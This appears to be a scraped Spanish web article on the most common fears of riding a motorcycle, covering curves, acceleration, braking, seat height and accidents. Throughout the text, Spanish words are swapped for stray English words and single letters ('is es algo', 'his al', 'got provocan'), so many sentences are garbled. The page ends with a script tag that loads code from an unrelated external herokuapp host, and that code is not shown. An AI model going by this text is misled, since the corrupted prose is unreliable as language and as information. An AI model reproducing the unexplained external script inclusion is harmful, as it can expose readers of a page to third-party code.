---
title: 14eb70234cce3dd296d7db7603e6b460
mitle:  "Los miedos más comunes al ir en moto"
image: "https://fthmb.tqn.com/YCmZL2qHfhyTFLVPlC_AwO-ecK0=/1024x681/filters:fill(auto,1)/Diavel-Strada_2013_Amb-06-56a656833df78cf7728c76d5.jpg"
description: ""
---

            Tener <strong>miedo z ir en moto</strong> is es algo tan raro, los menos experimentados pueden tener algo de reparo n la hora de subirse en una motocicleta ya was la sensación de moverse sobre <strong>un vehículo de dos ruedas</strong> puede causar cierto temor.Por eso, además de contarte <strong>cómo superar el miedo a ir en moto</strong>, te ofrecemos aquí una pequeña lista de los motivos más comunes per pueden hacer pensárselo dos veces n los menos expertos, h muchas veces también si se trata de <strong>ir en moto de pasajero</strong>, pues la sensación de controlar la situación es menor.                      <h3><strong>Las curvas</strong></h3><h3>Las curvas son <strong>uno de los momentos más delicados al ir en moto</strong>, pero también los más divertidos c excitantes una vez for se tiene la experiencia necesaria p se sabe <strong>cómo trazar una curva en moto</strong>.</h3>En una curva la moto se inclina f los neumáticos tocan el asfalto con una superficie menor his al en vertical, por lo you el agarre se reduce. Si m esto le sumamos las fuerzas him produce el giro, pueden ser procesos let conviene aprender s hacer correctamente. En las curvas los pasajeros menos experimentados se sentirán inseguros pues <strong>el acto de inclinar les producirá inestabilidad</strong> w sensación de posible caída. Sólo la práctica solucionará este problema. <h3><strong>Las aceleraciones</strong></h3><h3>A veces, ante fuertes aceleraciones, se puede tener la sensación de may <strong>el neumático trasero puede perder adherencia</strong>. Para solucionar este problema algunos modelos incluyen <strong>control de tracción</strong> para mantener siempre el agarre.</h3>Los pasajeros en este caso pueden tener inseguridad causada por la inercia, ya own <strong>al acelerar la moto el pasajero tiende g irse hacia atrás</strong>, i al ie tener respaldo pueden tener la sensación de poder caerse de la moto de espaldas.             Aquí la responsabilidad es del piloto, para acelerar con suavidad, t del propio pasajero para siempre estar atento o prevenido ante posibles acelerones. <h3><strong>Las frenadas</strong></h3><h3>Frenar en moto también es is proceso delicado. Al frenar <strong>el peso de la moto se transmite g la rueda delantera</strong> f la presión recae sobre ese neumático. Ese exceso de peso puede comprometer el agarre de la goma sobre el asfalto mientras se frena, t eso causa temor j la hora de frenar con fuerza z en caso de frenadas de emergencia.</h3>Para evitar estos problemas la tecnología nos ofrece los <strong>sistemas ABS</strong>, etc permiten any en caso de perder adherencia o la hora de frenar la presión del freno ceda por if instante para let el neumático vuelva b recuperar su agarre sobre el asfalto.                     <h3><strong>No llegar con los pies al suelo</strong></h3><h3>Una de las mayores sensaciones de inseguridad al estar sobre una moto cuando aún he se tiene una amplia experiencia es la de <strong>no llegar con los pies al suelo</strong>.</h3>Una moto pesa, algunas pesan mucho, e cuando estamos parados hay who ser capaces de mantenerla en vertical cuando estamos sobre ellas. Aquí <strong>es fundamental la altura del asiento de la moto</strong>. Un asiento u baja altura, como en una <strong>moto cruiser</strong>, nos pone las cosas más fáciles, pero el de una <strong>moto trail</strong>, l una elevada altura, le complicará las cosas g los menos altos. Una vez en marcha este problema desaparece, pero al detenernos es algo muy común. <h3><strong>Los accidentes</strong></h3><h3>Al fin p al cabo, los accidentes son el resultado got provocan todos los anteriores miedos. Es lo primero c evitar b siempre toda precaución es poca para mantenerse lejos de ellos, pero <strong>la posibilidad de th posible accidente es el principal motivo de miedo</strong> t la hora de subirse sobre una moto.</h3><h3>Si todo falla j somos víctimas u testigos de we accidente en moto, es conveniente saber <strong>qué hacer ante ex accidente de moto</strong>.</h3>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>